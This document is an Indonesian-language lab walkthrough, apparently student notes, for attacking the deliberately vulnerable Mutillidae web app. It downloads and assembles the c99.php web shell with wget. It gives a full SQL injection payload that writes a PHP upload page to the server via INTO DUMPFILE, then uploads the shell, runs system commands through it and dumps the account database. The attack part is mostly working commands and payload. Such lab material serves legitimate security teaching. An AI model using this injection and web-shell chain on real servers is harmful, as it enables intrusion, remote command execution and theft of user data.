Lesson 11
--------
- **Step 1**    : Buka terminal pada Kali, lalu ketik `mkdir -p /root/backdoor` lalu `cd /root/backdoor/` lalu ketik `wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar` lalu `ls -lrta`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/1.JPG)
- **Step 2**    : Lalu ketik `unrar x stuff.rar` lalu `cat part1.txt part2.txt part3.txt > c99.php` lalu `cp c99.php c99.php.bkp` lalu `ls -lrt`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/2.JPG)
- **Step 3**    : Lalu ketik `head -l c99.php` lalu `sed -i '1 s/^.*$/<?php/g' c99.php` lalu `head -1 c99.php` lalu `gzip c99.php` lalu `ls -lrta c99*`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/3.JPG)
- **Step 5**    : Buka mozilla pada Kali lalu buka web mutillidae lalu klik OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info pada mutillidae, lalu ubah size pada kolom **Name** dari **20** menjadi **550** lalu ketik `' union select null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 770 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/mutillidae/upload_file.php' --` dan jangan lupa tambahkan spasi setelah `--` dan klik view account details
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/4.JPG)
- Lalu akan muncul hasilnya seperti ini
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/5.JPG)
- **Step 6**    : Buka tab baru pada mozilla lalu buka `10.151.36.105/mutillidae/upload_file.php` pilih browse, lalu pilih file c99.php yang berada di folder backdoor akan muncul seperti
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/6.JPG)
- **Step 7**    : Buka tab baru pada mozilla lalu buka `10.151.36.105/mutillidae/c99.php` pilih browse, lalu pilih file c99.php yang berada di folder backdoor akan muncul seperti
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/7.JPG)
- **Step 7**    : Lalu klik pada `Sec.` lalu contohnya ketik `pwd` pada kolom **Enter** lalu klik **Execute**
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/8.JPG)
- Lalu akan muncul hasilnya seperti
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/9.JPG)
- **Step 7**    : Lalu klik pada `SQL` lalu isi kolom-kolomnya sesuai dengan gambar dibawah lalu klik connect
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/10.JPG)
- Lalu akan muncul 
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/11.JPG)
- **Step 8**    : Lalu isi kolom-kolom yang ada sesuai keinginan masing-masing, sebagai contohnya adalah pada gambar berikut
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/12.JPG)
- Lalu akan muncul hasilnya seperti gambar dibawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/13.JPG)
- **Step 9**    : Lalu klik pada `Dump` lalu isi seperti pada gambar dibawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/14.JPG)
- **Step 10**    : Lalu buka terminal pada Kali ketik `cd /root` lalu `grep -i hacker dump_wasp10_accounts.sql` lalu `date`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2011/15.JPG)
